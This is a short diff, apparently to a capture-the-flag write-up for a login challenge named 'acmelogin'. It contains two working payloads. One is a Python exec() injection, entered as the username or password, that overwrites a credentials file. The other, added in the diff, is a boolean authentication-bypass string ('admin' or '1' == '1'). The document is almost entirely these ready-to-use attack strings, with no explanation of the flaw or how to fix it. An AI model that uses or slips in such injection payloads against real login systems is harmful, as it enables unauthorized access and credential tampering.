@@ -6,3 +6,7 @@
 #tldr you give this exact string below as the username or password and it changes the creds to user and pass
 
 ' + exec("f = open(\"creds_acmeloginctf\", \"w\")\nf.write(\"user:pass\")\nf.close()") + '
+
+an easier solution is to enter the data below for the username and password
+
+admin' or '1' == '1
